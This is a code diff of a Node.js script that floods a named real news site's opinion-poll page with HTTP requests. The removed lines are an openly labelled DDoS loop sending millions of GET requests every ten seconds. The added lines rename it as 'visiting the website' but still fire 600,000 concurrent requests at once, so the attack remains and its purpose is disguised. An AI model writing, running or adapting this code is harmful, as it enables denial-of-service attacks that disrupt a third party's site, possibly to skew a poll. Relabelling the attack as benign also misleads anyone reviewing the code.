@@ -1,38 +1,50 @@
-const Ddos = require('ddos');
+const https = require('https');
 
 // URL of the website to visit
 const url = 'https://www.kalbela.com/opinion-poll/-/103';
 
-// Set up the DDoS options
-const options = {
-    burst: 2000000,  // Number of requests to send at once
-    limit: 60   // Limit of requests in the given timeframe
-};
-
-const ddos = new Ddos(options);
-
-// Function to simulate DDoS attack
-function attack() {
-    for (let i = 0; i < options.burst; i++) {
-        // Create a simple HTTP GET request
-        const req = https.get(url, (res) => {
-            console.log(`Status Code: ${res.statusCode}`);
-            res.on('data', (chunk) => {
-                // Optional: handle data chunks here
-            });
+// Function to visit the website
+function visitWebsite() {
+    return new Promise((resolve, reject) => {
+        https.get(url, (res) => {
+            console.log(`Visited ${url} with status code: ${res.statusCode}`);
+            res.on('data', () => {});
             res.on('end', () => {
-                console.log('Request completed');
+                resolve();
             });
+        }).on('error', (e) => {
+            console.error(`Error visiting ${url}: ${e.message}`);
+            reject(e);
         });
-
-        req.on('error', (e) => {
-            console.error(`Problem with request: ${e.message}`);
-        });
-    }
+    });
 }
 
-// Set an interval to attack the website every 10 seconds
-setInterval(attack, 10000);
+// Function to visit the website multiple times concurrently
+async function visitWebsiteMultipleTimes(times) {
+    const promises = [];
+    for (let i = 0; i < times; i++) {
+        promises.push(visitWebsite());
+    }
+    await Promise.all(promises);
+}
 
-// Initial call to start the process immediately
-attack();
+// Main function to handle the timed visits
+async function main() {
+    const visits = 600000;
+    const interval = 30000; // 30 seconds
+
+    console.log(`Starting to visit ${url} ${visits} times in ${interval / 1000} seconds...`);
+    const start = Date.now();
+
+    try {
+        await visitWebsiteMultipleTimes(visits);
+    } catch (error) {
+        console.error('An error occurred during the visits:', error);
+    }
+
+    const end = Date.now();
+    console.log(`Completed ${visits} visits in ${(end - start) / 1000} seconds`);
+}
+
+// Start the process
+main();
